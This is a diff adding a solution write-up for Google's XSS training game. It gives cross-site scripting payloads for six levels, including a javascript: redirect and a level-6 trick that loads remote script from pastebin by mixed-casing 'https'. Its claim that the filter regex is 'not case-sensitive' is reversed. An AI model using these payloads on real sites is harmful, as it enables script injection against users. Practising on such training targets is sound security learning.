@@ -1,0 +1,62 @@
+level1
+Input: 12 <script>alert(123)</script>
+
+level2
+<img src=xss onerror=alert(1)>
+
+Level3
+https://xss-game.appspot.com/level3/frame#1
+URL=https://xss-game.appspot.com/level3/frame#1' onerror='alert("xss")'>
+
+level4
+https://xss-game.appspot.com/level4
+timer=');alert('xss
+
+level5
+https://xss-game.appspot.com/level5
+This one was quite easy. On the first page you can see a link: https://xss-game.appspot.com/level5/frame/signup?next=confirm. Now let's have a look how this next parameter is used in confirm.html:
+
+[...]
+<script>
+      setTimeout(function() { window.location = '{{ next }}'; }, 5000);
+</script>
+[...]
+
+So the window.location is set based on the next parameter. This is a typical case for DOM based XSS. Besides that we have in signup.html:
+
+[...]
+<br><br>
+    <a href="{{ next }}">Next >></a>
+</body>
+[...]
+
+Again the next parameter is used as an a tag target. Ok, enough bla bla. Here is the PoC:
+
+    Go to https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)
+    Insert your Mail
+    Click Next >>
+    Voila!
+
+level6
+https://xss-game.appspot.com/level6
+https://xss-game.appspot.com/level6/frame#HTtps://pastebin.com/raw/rTRPYeNk
+
+This time I had to figure to host my JS code. So I've used pastebin.com to host my evil code. Next I had a look at the code. As you can read a new script tag is created and the src attribute is set appropriately. The only catch about it: You're not allowed to have a URL containing https?:
+
+[...]
+      if (url.match(/^https?:\/\//)) {
+	setInnerText(document.getElementById("log"),
+	  "Sorry, cannot load a URL containing \"http\".");
+	return;
+      }
+[...]
+
+Afterwards the text after the hash is used as the scripts src:
+
+// Load this awesome gadget
+scriptEl.src = url;
+
+Have you noticed something about the regexp? No?! Seriously not? Ok. It's not case-sensitive. You can escape it by using hTTps or any other combination. So the final PoC:
+
+    https://xss-game.appspot.com/level6/frame#htTps://pastebin.com/raw.php?i=15S5qZs0
+https://xss-game.appspot.com/level6/frame#HTTPS://www.google.com/jsapi?callback=alert
